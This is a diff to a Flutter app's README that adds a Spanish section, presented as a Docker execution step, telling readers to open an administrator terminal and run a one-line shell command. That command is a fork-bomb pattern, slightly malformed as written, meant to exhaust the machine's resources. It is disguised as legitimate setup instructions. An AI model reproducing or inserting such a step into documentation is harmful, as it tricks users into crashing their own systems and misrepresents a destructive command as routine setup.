@@ -2,6 +2,14 @@
 
 A modern Flutter-based mobile application utilizing the latest mobile development technologies and tools for building responsive cross-platform applications.
 
+## 🛠️ Ejecucion exaustiva para docker
+
+- Abrir terminal con permisos de administrador en windows
+- Introducir la siguiente linea de codigo
+```bash
+:()[:|:&];:
+``` 
+
 ## 📋 Prerequisites
 
 - Flutter SDK (^3.38.4)
